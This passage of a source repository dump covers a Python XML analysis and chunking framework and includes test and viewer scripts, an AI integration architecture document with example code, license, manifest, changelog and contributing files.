                
                print(f"✅ File is readable and appears to be XML")
                print(f"📊 Sample size: {len(first_part)} characters from first 1000 lines")
                return True
                
            except Exception as e:
                print(f"❌ Test failed: {e}")
                return False
    
    print("❌ No sample files found")
    return False

def main():
    print("🧪 Testing XML Analyzer Setup")
    print("=" * 40)
    
    # Test imports
    if not test_imports():
        return False
    
    # Test sample file
    if not test_sample_file():
        return False
    
    print("\n✅ All tests passed!")
    print("🚀 Ready to use: python analyze.py <xml_file>")
    return True

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
</file>

<file path="tests/view_chunk_content.py">
#!/usr/bin/env python3
"""
Simple viewer for chunk content
"""

import json
import sys
import os
from datetime import datetime

def view_chunk_content(file_path, chunk_number=None, preview_length=500):
    """View content of specific chunks"""
    
    if not os.path.exists(file_path):
        print(f"❌ File not found: {file_path}")
        return
    
    with open(file_path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    
    metadata = data.get('metadata', {})
    chunks = data.get('chunks', [])
    
    print(f"📄 CHUNK CONTENT VIEWER")
    print("=" * 50)
    print(f"File: {file_path}")
    print(f"Strategy: {metadata.get('strategy', 'unknown')}")
    print(f"Document Type: {metadata.get('document_type', 'unknown')}")
    print(f"Total Chunks: {len(chunks)}")
    print()
    
    if chunk_number is None:
        # Show summary of all chunks
        print("📋 CHUNK SUMMARY")
        print("-" * 30)
        for i, chunk in enumerate(chunks, 1):
            print(f"Chunk {i}: {chunk['chunk_id']}")
            print(f"  Path: {chunk['element_path']}")
            print(f"  Tokens: {chunk['token_estimate']}")
            print(f"  Content Length: {chunk['content_length']:,} chars")
            
            # Show first line of content
            content = chunk['full_content']
            first_line = content.split('\n')[0][:80]
            if len(content.split('\n')[0]) > 80:
                first_line += "..."
            print(f"  Preview: {first_line}")
            print()
            
        print(f"💡 To view full content of a specific chunk, run:")
        print(f"   python view_chunk_content.py {file_path} <chunk_number>")
        
    else:
        # Show specific chunk content
        if chunk_number < 1 or chunk_number > len(chunks):
            print(f"❌ Invalid chunk number. Must be 1-{len(chunks)}")
            return
            
        chunk = chunks[chunk_number - 1]
        print(f"📄 CHUNK {chunk_number} CONTENT")
        print("=" * 50)
        print(f"Chunk ID: {chunk['chunk_id']}")
        print(f"Element Path: {chunk['element_path']}")
        print(f"Token Estimate: {chunk['token_estimate']}")
        print(f"Content Length: {chunk['content_length']:,} characters")
        print(f"Elements Included: {len(chunk['elements_included'])} unique elements")
        print()
        
        if chunk['metadata']:
            print("📋 Metadata:")
            for key, value in chunk['metadata'].items():
                if key not in ['document_type', 'chunk_index', 'total_chunks']:
                    print(f"  {key}: {value}")
            print()
        
        print("📄 FULL CONTENT:")
        print("-" * 30)
        
        content = chunk['full_content']
        if len(content) <= preview_length:
            print(content)
        else:
            print(content[:preview_length])
            print(f"\n... (content truncated at {preview_length} chars)")
            print(f"💡 Full content is {len(content):,} characters")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python view_chunk_content.py <chunk_file.json> [chunk_number]")
        print()
        print("Available chunk files:")
        import glob
        chunk_files = glob.glob("scap_chunks_*.json")
        for file in sorted(chunk_files):
            size = os.path.getsize(file)
            print(f"  {file} ({size:,} bytes)")
        sys.exit(1)
    
    file_path = sys.argv[1]
    chunk_number = int(sys.argv[2]) if len(sys.argv) > 2 else None
    
    view_chunk_content(file_path, chunk_number)
</file>

<file path="AI_INTEGRATION_ARCHITECTURE.md">
# XML Analysis Framework - AI Integration Architecture

## 🚀 AI Workflow Integration Diagram

```mermaid
graph TB
    %% Input Sources
    subgraph sources["📁 XML Data Sources"]
        A1["Enterprise Systems<br/>• ServiceNow Tickets<br/>• Build Configurations<br/>• Security Reports"]
        A2["Development Assets<br/>• Maven POMs<br/>• Log4j Configs<br/>• Spring Beans"]
        A3["Content Systems<br/>• Documentation<br/>• API Definitions<br/>• Sitemaps"]
    end

    %% XML Analysis Framework
    subgraph framework["🔬 XML Analysis Framework"]
        B1["Document Analyzer<br/>29 Specialized Handlers"]
        B2["Smart Chunking<br/>• Hierarchical<br/>• Content-Aware<br/>• Token-Optimized"]
        B3["AI-Ready Output<br/>• Structured JSON<br/>• Context Metadata<br/>• Use Case Tags"]
    end

    %% AI Infrastructure
    subgraph infrastructure["🤖 AI Infrastructure Layer"]
        C1["Vector Store<br/>• Embeddings<br/>• Semantic Search<br/>• Similarity Matching"]
        C2["Graph Database<br/>• Relationships<br/>• Dependencies<br/>• Impact Analysis"]
        C3["LLM Agent<br/>• Analysis<br/>• Generation<br/>• Decision Making"]
    end

    %% AI Applications
    subgraph applications["🎯 AI Applications"]
        D1["Security Intelligence<br/>• Vulnerability Detection<br/>• Compliance Monitoring<br/>• Risk Assessment"]
        D2["DevOps Automation<br/>• Config Optimization<br/>• Dependency Analysis<br/>• Build Intelligence"]
        D3["Knowledge Management<br/>• Documentation Search<br/>• Code Understanding<br/>• Technical Insights"]
    end

    %% Data Flow
    A1 --> B1
    A2 --> B1
    A3 --> B1
    
    B1 --> B2
    B2 --> B3
    
    B3 --> C1
    B3 --> C2
    B3 --> C3
    
    C1 --> D1
    C1 --> D2
    C1 --> D3
    
    C2 --> D1
    C2 --> D2
    C2 --> D3
    
    C3 --> D1
    C3 --> D2
    C3 --> D3

    %% Feedback Loops
    D1 -.-> C3
    D2 -.-> C3
    D3 -.-> C3
    
    C3 -.-> B1
    C2 -.-> B1

    %% Styling
    classDef xmlFramework fill:#e1f5fe,stroke:#01579b,stroke-width:2px
    classDef aiInfra fill:#f3e5f5,stroke:#4a148c,stroke-width:2px
    classDef appStyle fill:#e8f5e8,stroke:#1b5e20,stroke-width:2px
    classDef sourceStyle fill:#fff3e0,stroke:#e65100,stroke-width:2px

    class B1,B2,B3 xmlFramework
    class C1,C2,C3 aiInfra
    class D1,D2,D3 appStyle
    class A1,A2,A3 sourceStyle
```

## 🔄 Detailed Integration Workflows

### 1. **Security Intelligence Pipeline**

```mermaid
sequenceDiagram
    participant XS as XML Source
    participant XF as XML Framework
    participant VS as Vector Store
    participant GD as Graph DB
    participant LLM as LLM Agent
    participant SI as Security Intel

    XS->>XF: SCAP/SAML/SOAP Documents
    XF->>XF: Detect Document Type (90-100% confidence)
    XF->>XF: Extract Security Metadata
    XF->>XF: Generate Semantic Chunks
    
    XF->>VS: Store Embeddings with Context
    XF->>GD: Map Security Relationships
    XF->>LLM: Structured Analysis Data
    
    LLM->>SI: Vulnerability Assessment
    LLM->>SI: Compliance Recommendations
    LLM->>SI: Risk Prioritization
    
    SI->>GD: Update Risk Graph
    SI->>VS: Store Intelligence Insights
```

### 2. **DevOps Configuration Intelligence**

```mermaid
flowchart LR
    subgraph "Configuration Sources"
        A[Maven POMs]
        B[Ant Builds]
        C[Spring Configs]
        D[Log4j Configs]
    end
    
    subgraph "XML Analysis"
        E[Handler Detection<br/>95-100% confidence]
        F[Dependency Extraction]
        G[Security Analysis]
        H[Chunk Generation]
    end
    
    subgraph "AI Processing"
        I[Vector Embeddings<br/>Configuration Patterns]
        J[Dependency Graph<br/>Impact Analysis]
        K[LLM Analysis<br/>Optimization]
    end
    
    subgraph "DevOps Outcomes"
        L[Vulnerability Alerts]
        M[Config Optimization]
        N[Technical Debt Analysis]
        O[Modernization Plans]
    end
    
    A --> E
    B --> E
    C --> E
    D --> E
    
    E --> F
    E --> G
    E --> H
    
    F --> I
    G --> J
    H --> K
    
    I --> L
    J --> M
    K --> N
    K --> O
```

### 3. **Knowledge Management Pipeline**

```mermaid
graph TB
    subgraph "Content Processing"
        A1[DocBook Documentation]
        A2[API Definitions WADL/WSDL]
        A3[RSS/Atom Feeds]
        A4[Technical Documentation]
    end
    
    subgraph "Intelligent Chunking"
        B1[Hierarchical Structure<br/>Respect Document Semantics]
        B2[Content-Aware Grouping<br/>Similar Topics Together]
        B3[Token-Optimized Sizing<br/>LLM Context Windows]
    end
    
    subgraph "Vector Search & Retrieval"
        C1[Semantic Embeddings<br/>Content Similarity]
        C2[Contextual Search<br/>Cross-Document References]
        C3[Topic Clustering<br/>Knowledge Organization]
    end
    
    subgraph "Graph Intelligence"
        D1[Document Relationships<br/>Cross-References & Dependencies]
        D2[Concept Networks<br/>Technical Knowledge Graphs]
        D3[Impact Analysis<br/>Change Propagation]
    end
    
    subgraph "LLM Applications"
        E1[Technical Q&A<br/>Context-Aware Responses]
        E2[Code Understanding<br/>Configuration Explanations]
        E3[Documentation Generation<br/>Auto-Summarization]
    end
    
    A1 --> B1
    A2 --> B2
    A3 --> B2
    A4 --> B3
    
    B1 --> C1
    B2 --> C2
    B3 --> C3
    
    B1 --> D1
    B2 --> D2
    B3 --> D3
    
    C1 --> E1
    C2 --> E2
    C3 --> E3
    
    D1 --> E1
    D2 --> E2
    D3 --> E3
```

## 🛠️ Technical Implementation Examples

### Vector Store Integration
```python
from xml_analysis_framework import XMLDocumentAnalyzer, ChunkingOrchestrator
import chromadb

# Initialize framework
analyzer = XMLDocumentAnalyzer()
chunker = ChunkingOrchestrator()

# Process XML documents
analysis = analyzer.analyze_document("config.xml")
chunks = chunker.chunk_document("config.xml", analysis)

# Store in vector database
client = chromadb.Client()
collection = client.create_collection("xml_knowledge")

for chunk in chunks:
    collection.add(
        documents=[chunk.content],
        metadatas=[{
            "document_type": analysis["document_type"].type_name,
            "handler": analysis["handler_used"],
            "confidence": analysis["confidence"],
            "chunk_path": chunk.element_path,
            "ai_use_cases": str(analysis["analysis"].ai_use_cases)
        }],
        ids=[chunk.chunk_id]
    )
```

### Graph Database Integration
```python
from neo4j import GraphDatabase

class XMLGraphBuilder:
    def __init__(self, uri, user, password):
        self.driver = GraphDatabase.driver(uri, auth=(user, password))
    
    def build_config_graph(self, analysis_results):
        with self.driver.session() as session:
            # Create document node
            session.run("""
                MERGE (doc:XMLDocument {
                    path: $path,
                    type: $doc_type,
                    handler: $handler,
                    confidence: $confidence
                })
            """, 
                path=analysis_results["file_path"],
                doc_type=analysis_results["document_type"].type_name,
                handler=analysis_results["handler_used"],
                confidence=analysis_results["confidence"]
            )
            
            # Create dependency relationships for build files
            if "dependencies" in analysis_results["analysis"].key_findings:
                for dep in analysis_results["analysis"].key_findings["dependencies"]:
                    session.run("""
                        MATCH (doc:XMLDocument {path: $path})
                        MERGE (dep:Dependency {name: $dep_name})
                        MERGE (doc)-[:DEPENDS_ON]->(dep)
                    """, 
                        path=analysis_results["file_path"],
                        dep_name=dep["name"]
                    )
```

### LLM Agent Integration
```python
from openai import OpenAI

class XMLIntelligenceAgent:
    def __init__(self, openai_client):
        self.client = openai_client
        self.analyzer = XMLDocumentAnalyzer()
    
    def analyze_security_posture(self, xml_files):
        security_insights = []
        
        for xml_file in xml_files:
            analysis = self.analyzer.analyze_document(xml_file)
            
            if "security" in analysis["document_type"].type_name.lower():
                prompt = f"""
                Analyze this {analysis['document_type'].type_name} document:
                
                Key Findings: {analysis['analysis'].key_findings}
                Security Metrics: {analysis['analysis'].quality_metrics}
                
                Provide security recommendations and risk assessment.
                """
                
                response = self.client.chat.completions.create(
                    model="gpt-4",
                    messages=[{
                        "role": "system", 
                        "content": "You are a cybersecurity expert analyzing XML configurations."
                    }, {
                        "role": "user", 
                        "content": prompt
                    }]
                )
                
                security_insights.append({
                    "file": xml_file,
                    "document_type": analysis["document_type"].type_name,
                    "analysis": response.choices[0].message.content,
                    "confidence": analysis["confidence"]
                })
        
        return security_insights
```

## 🎯 AI Use Case Categories

### **Enterprise Security Intelligence**
- **SCAP Compliance Monitoring**: Automated security posture assessment
- **SAML Security Analysis**: Authentication flow vulnerability detection  
- **Log4j Vulnerability Scanning**: CVE detection and remediation guidance
- **SOAP Security Assessment**: Web service security configuration review

### **DevOps & Configuration Intelligence**
- **Dependency Risk Analysis**: Maven/Ant/Ivy dependency vulnerability scanning
- **Configuration Drift Detection**: Hibernate/Spring configuration consistency
- **Build Optimization**: Performance and security improvements for build systems
- **Technical Debt Assessment**: Legacy configuration modernization planning

### **Knowledge Management & Documentation**
- **Technical Documentation Search**: Semantic search across DocBook, XHTML content
- **API Discovery**: WADL/WSDL service catalog and integration guidance
- **Content Intelligence**: RSS/Atom feed analysis for trend detection
- **Cross-Reference Analysis**: Document relationship mapping and impact analysis

### **Geospatial & Data Intelligence**
- **Route Optimization**: GPX track analysis for logistics and fitness
- **Geographic Pattern Analysis**: KML data for location intelligence
- **Network Analysis**: GraphML data for system topology understanding
- **Translation Workflow**: XLIFF analysis for localization intelligence

## 📊 Performance Characteristics

### **Framework Performance**
- **Processing Speed**: 38.8 chunks/file average, 0.015s per document
- **Accuracy**: 95-100% confidence for specialized handlers
- **Scalability**: Handles 71 diverse XML files with 100% success rate
- **Memory Efficiency**: Streaming processing for large documents

### **AI Integration Benefits**
- **Context Preservation**: Semantic chunking maintains document structure
- **Relationship Mapping**: Graph integration enables dependency analysis  
- **Semantic Search**: Vector embeddings enable intelligent content discovery
- **Automated Insights**: LLM integration provides expert-level analysis

## 🔮 Future AI Applications

### **Predictive Analytics**
- **Security Breach Prediction**: Historical SCAP data pattern analysis
- **Configuration Failure Prediction**: Build system reliability modeling
- **Performance Optimization**: Predictive configuration tuning

### **Automated Remediation**
- **Security Fix Generation**: Automated SAML/SOAP security improvements
- **Configuration Modernization**: Legacy Spring/Hibernate migration assistance
- **Dependency Upgrade Planning**: Automated dependency update strategies

### **Intelligence Fusion**
- **Cross-System Correlation**: ServiceNow incidents + system configurations
- **Impact Analysis**: Change propagation across enterprise systems
- **Risk Scoring**: Comprehensive security posture assessment
</file>

<file path="LICENSE">
MIT License

Copyright (c) 2025 Wes Jackson

Note: Some of the code in this project was written with AI.

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
</file>

<file path="MANIFEST.in">
# Include essential files
include README.md
include LICENSE
include requirements.txt
include pyproject.toml

# Include documentation
recursive-include docs *.md *.rst *.txt
recursive-include examples *.py *.md

# Include source code
recursive-include src *.py

# Exclude test files and development artifacts
recursive-exclude tests *
recursive-exclude test_outputs *
recursive-exclude artifacts *
recursive-exclude scripts/debug *
exclude *.json
exclude save_scap_chunks.py
exclude view_chunk_content.py
exclude *_analysis_*.json
exclude *_chunks_*.json
exclude chunking_analysis_*.json
exclude scap_*.json
exclude servicenow_*.json

# Include package data
global-include *.txt *.md
</file>

<file path="REPOSITORY_UPDATE_SUMMARY.md">
# Repository Information Update Summary

## Changes Made for v1.2.0

### 🔗 **GitHub Repository URLs Updated**
All references changed from:
- `https://github.com/wjackson/xml-analysis-framework`

To:
- `https://github.com/redhat-ai-americas/xml-analysis-framework`

### 📧 **Contact Information Updated**
Author email changed from:
- `wjackson@example.com`

To:
- `wjackson@redhat.com`

### 📁 **Files Updated**

#### **setup.py**
- ✅ `url` field
- ✅ `author_email` field  
- ✅ `project_urls` section (Bug Reports, Source, Documentation)

#### **pyproject.toml**
- ✅ `authors` email field
- ✅ `[project.urls]` section (Homepage, Repository, Issues, Documentation)

#### **README.md**
- ✅ Installation section git clone command
- ✅ Fixed smart chunking example with analysis format conversion

#### **CONTRIBUTING.md**
- ✅ Development setup git clone command

#### **Version Files**
- ✅ setup.py version → 1.2.0
- ✅ src/__init__.py version → 1.2.0

#### **CHANGELOG.md**
- ✅ Added v1.2.0 entry documenting all changes

### 🎯 **PyPI Package Links**
When v1.2.0 is published, PyPI will show:
- **Homepage**: https://github.com/redhat-ai-americas/xml-analysis-framework
- **Repository**: https://github.com/redhat-ai-americas/xml-analysis-framework  
- **Issues**: https://github.com/redhat-ai-americas/xml-analysis-framework/issues
- **Documentation**: https://github.com/redhat-ai-americas/xml-analysis-framework/blob/main/README.md

### ✅ **Verification**
All references have been updated consistently across the project. The PKG-INFO file will be automatically regenerated during the next build process with the correct information.

### 📦 **Next Steps**
To update PyPI with these changes:
1. Commit and push changes to Git
2. Build the package: `python -m build`
3. Upload to PyPI: `twine upload dist/*`

The new v1.2.0 package will have all the correct Red Hat AI Americas repository links and contact information.
</file>

<file path="requirements.txt">
# No external dependencies required - uses only Python standard library
# The analyzer is designed to work with Python 3.7+

# Optional: For enhanced analysis (not required for basic functionality)
# lxml>=4.6.0        # For faster XML parsing (optional)
# click>=8.0.0       # For enhanced CLI (optional)
</file>

<file path="examples/basic_analysis.py">
#!/usr/bin/env python3
"""
Simple XML Document Analyzer

Usage: python analyze.py <filename>

Analyzes XML documents and provides structured output for LLM processing.
Automatically detects document type and generates appropriate analysis.
"""

import sys
import json
import time
from pathlib import Path

# Add src directory to path for imports
sys.path.append(str(Path(__file__).parent / "src"))

try:
    from core.schema_analyzer import XMLSchemaAnalyzer
except ImportError as e:
    print(f"Error: Could not import analyzer modules: {e}")
    print("Make sure the src/ directory contains the required files.")
    sys.exit(1)

def format_size(bytes_size):
    """Format file size in human readable format"""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if bytes_size < 1024.0:
            return f"{bytes_size:.1f} {unit}"
        bytes_size /= 1024.0
    return f"{bytes_size:.1f} TB"

def analyze_file(file_path):
    """Analyze XML file and return structured results"""
    
    file_path = Path(file_path)
    
    # Basic file validation
    if not file_path.exists():
        return {"error": f"File not found: {file_path}"}
    
    if not file_path.is_file():
        return {"error": f"Path is not a file: {file_path}"}
    
    file_size = file_path.stat().st_size
    
    # Check if it's XML
    if file_path.suffix.lower() != '.xml':
        return {"error": f"Not an XML file: {file_path.suffix}"}
    
    print(f"📄 Analyzing: {file_path.name}")
    print(f"📊 Size: {format_size(file_size)}")
    print("⏳ Processing...")
    
    start_time = time.time()
    
    try:
        # Use the analyzer
        analyzer = XMLSchemaAnalyzer()
        schema = analyzer.analyze_file(str(file_path))
        
        # Generate LLM description
        llm_description = analyzer.generate_llm_description(schema)
        
        processing_time = time.time() - start_time
        
        return {
            "success": True,
            "file_info": {
                "name": file_path.name,
                "size_bytes": file_size,
                "size_formatted": format_size(file_size)
            },
            "schema": {
                "document_type": schema.root_element,
                "total_elements": schema.total_elements,
                "unique_elements": len(schema.elements),
                "max_depth": schema.max_depth,
                "namespaces": schema.namespaces
            },
            "analysis": llm_description,
            "processing_time": processing_time
        }
        
    except Exception as e:
        return {
            "error": f"Analysis failed: {str(e)}",
            "processing_time": time.time() - start_time
        }

def print_results(results):
    """Print analysis results in a clean format"""
    
    if "error" in results:
        print(f"❌ {results['error']}")
        return
    
    print("✅ Analysis Complete!")
    print("=" * 60)
    
    # File information
    info = results["file_info"]
    print(f"📄 File: {info['name']}")
    print(f"📊 Size: {info['size_formatted']}")
    
    # Schema summary
    schema = results["schema"]
    print(f"\n📋 Document Structure:")
    print(f"   Root Element: {schema['document_type']}")
    print(f"   Total Elements: {schema['total_elements']:,}")
    print(f"   Unique Elements: {schema['unique_elements']}")
    print(f"   Max Depth: {schema['max_depth']}")
    print(f"   Namespaces: {len(schema['namespaces'])}")
    
    # Processing info
    print(f"\n⏱️  Processed in {results['processing_time']:.2f} seconds")
    
    # Detailed analysis
    print(f"\n🔍 Detailed Analysis:")
    print("-" * 40)
    print(results["analysis"])

def save_results(results, output_file):
    """Save results to JSON file"""
    try:
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        print(f"\n💾 Results saved to: {output_file}")
    except Exception as e:
        print(f"⚠️  Could not save results: {e}")

def main():
    """Main entry point"""
    
    if len(sys.argv) != 2:
        print("Usage: python analyze.py <xml_file>")
        print("\nExample:")
        print("  python analyze.py sample_data/node2.example.com-STIG-20250710162433.xml")
        sys.exit(1)
    
    input_file = sys.argv[1]
    
    # Analyze the file
    results = analyze_file(input_file)
    
    # Print results
    print_results(results)
    
    # Save results if successful
    if results.get("success"):
        output_file = Path(input_file).stem + "_analysis.json"
        save_results(results, output_file)
    
    # Return appropriate exit code
    sys.exit(0 if results.get("success") else 1)

if __name__ == "__main__":
    main()
</file>

<file path="examples/enhanced_analysis.py">
#!/usr/bin/env python3
"""
Enhanced XML Analyzer with Specialized Handlers

This is an updated version of analyze.py that integrates the specialized handler system
for more intelligent XML document analysis.
"""

import sys
import json
import time
from pathlib import Path

# Add src directory to path for imports
sys.path.append(str(Path(__file__).parent / "src"))

try:
    from core.analyzer import XMLDocumentAnalyzer
    from core.schema_analyzer import XMLSchemaAnalyzer
    from core.chunking import XMLChunkingStrategy
except ImportError as e:
    print(f"Error: Could not import required modules: {e}")
    print("Make sure the src/ directory contains all required files.")
    sys.exit(1)

def format_size(bytes_size):
    """Format file size in human readable format"""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if bytes_size < 1024.0:
            return f"{bytes_size:.1f} {unit}"
        bytes_size /= 1024.0
    return f"{bytes_size:.1f} TB"

def analyze_file_enhanced(file_path):
    """Enhanced analysis using specialized handlers"""
    
    file_path = Path(file_path)
    
    # Basic file validation
    if not file_path.exists():
        return {"error": f"File not found: {file_path}"}
    
    if not file_path.is_file():
        return {"error": f"Path is not a file: {file_path}"}
    
    file_size = file_path.stat().st_size
    
    # Check if it's XML
    if file_path.suffix.lower() != '.xml':
        return {"error": f"Not an XML file: {file_path.suffix}"}
    
    print(f"📄 Analyzing: {file_path.name}")
    print(f"📊 Size: {format_size(file_size)}")
    print("⏳ Processing...")
    
    start_time = time.time()
    
    try:
        # Use specialized analyzer first
        specialized_analyzer = XMLDocumentAnalyzer()
        specialized_result = specialized_analyzer.analyze_document(str(file_path))
        
        # Also run basic schema analysis for compatibility
        basic_analyzer = XMLSchemaAnalyzer()
        schema = basic_analyzer.analyze_file(str(file_path))
        llm_description = basic_analyzer.generate_llm_description(schema)
        
        # Check if we should chunk the document
        should_chunk = file_size > 1024 * 1024  # Chunk if larger than 1MB
        chunks = []
        
        if should_chunk:
            print("📦 Large file detected, applying chunking strategy...")
            chunker = XMLChunkingStrategy()
            chunks = chunker.chunk_document(
                str(file_path),
                specialized_result
            )
            print(f"✂️  Created {len(chunks)} chunks")
        
        processing_time = time.time() - start_time
        
        return {
            "success": True,
            "file_info": {
                "name": file_path.name,
                "size_bytes": file_size,
                "size_formatted": format_size(file_size)
            },
            "basic_schema": {
                "document_type": schema.root_element,
                "total_elements": schema.total_elements,
                "unique_elements": len(schema.elements),
                "max_depth": schema.max_depth,
                "namespaces": schema.namespaces
            },
            "specialized_analysis": {
                "document_type": specialized_result.get("document_type"),
                "handler": specialized_result.get("handler_used"),
                "confidence": specialized_result.get("confidence"),
                "analysis": specialized_result.get("analysis")
            },
            "chunking": {
                "was_chunked": should_chunk,
                "chunk_count": len(chunks),
                "chunks_summary": [
                    {
                        "id": chunk.chunk_id,
                        "tokens": chunk.token_estimate,
                        "path": chunk.element_path
                    } for chunk in chunks[:5]  # First 5 chunks as summary
                ] if chunks else []
            },
            "llm_description": llm_description,
            "processing_time": processing_time
        }
        
    except Exception as e:
        return {
            "error": f"Analysis failed: {str(e)}",
            "processing_time": time.time() - start_time
        }

def print_enhanced_results(results):
    """Print enhanced analysis results"""
    
    if "error" in results:
        print(f"❌ {results['error']}")
        return
    
    print("✅ Analysis Complete!")
    print("=" * 60)
    
    # File information
    info = results["file_info"]
    print(f"📄 File: {info['name']}")
    print(f"📊 Size: {info['size_formatted']}")
    
    # Basic schema summary
    schema = results["basic_schema"]
    print(f"\n📋 Basic Structure:")
    print(f"   Root Element: {schema['document_type']}")
    print(f"   Total Elements: {schema['total_elements']:,}")
    print(f"   Unique Elements: {schema['unique_elements']}")
    print(f"   Max Depth: {schema['max_depth']}")
    print(f"   Namespaces: {len(schema['namespaces'])}")
    
    # Specialized analysis
    specialized = results["specialized_analysis"]
    if specialized["document_type"]:
        print(f"\n🎯 Document Type Detection:")
        print(f"   Type: {specialized['document_type'].get('type_name', 'Unknown')}")
        print(f"   Confidence: {specialized['confidence']:.1%}")
        print(f"   Handler: {specialized['handler']}")
        
        analysis = specialized["analysis"]
        if analysis:
            print(f"\n🔍 Specialized Analysis:")
            
            # Key findings
            if analysis.get("key_findings"):
                print("   Key Findings:")
                for key, value in list(analysis["key_findings"].items())[:5]:
                    print(f"     - {key}: {value}")
            
            # AI use cases
            if analysis.get("ai_use_cases"):
                print("   Potential AI Use Cases:")
                for use_case in analysis["ai_use_cases"][:3]:
                    print(f"     - {use_case}")
            
            # Data quality
            if analysis.get("quality_metrics"):
                print("   Data Quality:")
                for metric, score in analysis["quality_metrics"].items():
                    print(f"     - {metric}: {score:.1%}")
    
    # Chunking information
    chunking = results["chunking"]
    if chunking["was_chunked"]:
        print(f"\n📦 Document Chunking:")
        print(f"   Chunks Created: {chunking['chunk_count']}")
        if chunking["chunks_summary"]:
            print("   Sample Chunks:")
            for chunk in chunking["chunks_summary"]:
                print(f"     - {chunk['id']}: ~{chunk['tokens']} tokens")
    
    # Processing info
    print(f"\n⏱️  Processed in {results['processing_time']:.2f} seconds")

def save_enhanced_results(results, output_file):
    """Save enhanced results to JSON file"""
    try:
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        print(f"\n💾 Results saved to: {output_file}")
    except Exception as e:
        print(f"⚠️  Could not save results: {e}")

def main():
    """Main entry point"""
    
    if len(sys.argv) < 2:
        print("Enhanced XML Analyzer")
        print("====================")
        print("\nUsage: python analyze_enhanced.py <xml_file> [options]")
        print("\nOptions:")
        print("  --basic     Use only basic analysis (no specialized handlers)")
        print("  --no-chunk  Disable chunking for large files")
        print("\nExamples:")
        print("  python analyze_enhanced.py sample_data/node2.example.com-STIG-20250710162433.xml")
        print("  python analyze_enhanced.py my_file.xml --basic")
        sys.exit(1)
    
    input_file = sys.argv[1]
    use_basic = "--basic" in sys.argv
    
    if use_basic:
        # Import and use the original analyze_file function
        from basic_analysis import analyze_file, print_results, save_results
        results = analyze_file(input_file)
        print_results(results)
        
        if results.get("success"):
            output_file = Path(input_file).stem + "_analysis.json"
            save_results(results, output_file)
    else:
        # Use enhanced analysis
        results = analyze_file_enhanced(input_file)
        print_enhanced_results(results)
        
        if results.get("success"):
            output_file = Path(input_file).stem + "_enhanced_analysis.json"
            save_enhanced_results(results, output_file)
    
    # Return appropriate exit code
    sys.exit(0 if results.get("success") else 1)

if __name__ == "__main__":
    main()
</file>

<file path="CHANGELOG.md">
# Changelog

All notable changes to this project will be documented in this file.

## [1.2.0] - 2025-01-25

### Changed
- **Repository Information**: Updated all GitHub links to point to official Red Hat AI Americas repository
  - Changed from: `https://github.com/wjackson/xml-analysis-framework`
  - Changed to: `https://github.com/redhat-ai-americas/xml-analysis-framework`
  - Updated in setup.py, pyproject.toml, README.md, and CONTRIBUTING.md
- **Contact Information**: Updated author email to `wjackson@redhat.com`

### Fixed
- **Smart Chunking Example**: Updated README.md smart chunking example to include required analysis format conversion

## [1.1.0] - 2025-01-25

### Fixed
- **Package Description**: Clarified that this is a preprocessing framework, not one that performs AI/ML operations
  - Changed from: "Comprehensive framework for analyzing XML documents with AI/ML processing support" 
  - Changed to: "XML document analysis and preprocessing framework designed for AI/ML data pipelines"
  - Updated in setup.py, pyproject.toml, README.md, and src/__init__.py
- **Documentation Updates**: Updated all import examples in README.md to reflect correct package structure
  - Changed `from xml_analysis_framework import ...` to `from core.* import ...`
  - Changed `from src.core.* import ...` to `from core.* import ...`
  - Updated API method signatures and return value access patterns
  - Fixed chunking workflow examples to use `ChunkingOrchestrator` correctly

### Changed
- **Import Structure**: All documentation now correctly shows the installed package import structure:
  - Basic analysis: `from core.schema_analyzer import XMLSchemaAnalyzer`
  - Enhanced analysis: `from core.analyzer import XMLDocumentAnalyzer`
  - Chunking: `from core.chunking import ChunkingOrchestrator, XMLChunkingStrategy`

### Added
- **API Examples**: Added correct examples showing:
  - Proper access to `DocumentTypeInfo` attributes (`.type_name`, `.confidence`)
  - Correct `SpecializedAnalysis` attribute access (`.ai_use_cases`, `.structured_data`)
  - Format conversion for chunking analysis
  - Token estimation using `XMLChunkingStrategy().estimate_tokens()`

### Updated
- **Version**: Bumped to 1.1.0 in setup.py and src/__init__.py
- **Examples**: Updated examples/basic_analysis.py and examples/enhanced_analysis.py imports
- **Documentation**: All README.md code examples now work correctly with the installed package

### Validated
- All documentation examples tested and verified to work with the actual installed package structure
- Confirmed compatibility with existing PyPI package (1.0.0) → updated for new release (1.1.0)

## [1.0.0] - 2025-01-25

### Added
- Initial release with XML analysis framework
- 29 specialized XML handlers
- Chunking strategies for AI/ML processing
- Core analysis engine with schema detection
</file>

<file path="CONTRIBUTING.md">
# Contributing to XML Analysis Framework

Thank you for your interest in contributing to the XML Analysis Framework! This document provides guidelines and information for contributors.

## 🎯 Project Vision

The XML Analysis Framework is designed to be a comprehensive, production-ready system for analyzing XML documents with AI/ML processing support. We aim to:

- Support enterprise XML formats with specialized handlers
- Maintain 100% success rate across diverse XML files
- Generate high-quality semantic chunks for AI applications
- Provide zero external dependencies (pure Python)
- Enable easy integration with vector stores and LLM systems

## 🚀 Getting Started

### Development Setup

1. **Clone the repository:**
   ```bash
   git clone https://github.com/redhat-ai-americas/xml-analysis-framework.git
   cd xml-analysis-framework
   ```

2. **Create a virtual environment:**
   ```bash
   python -m venv venv
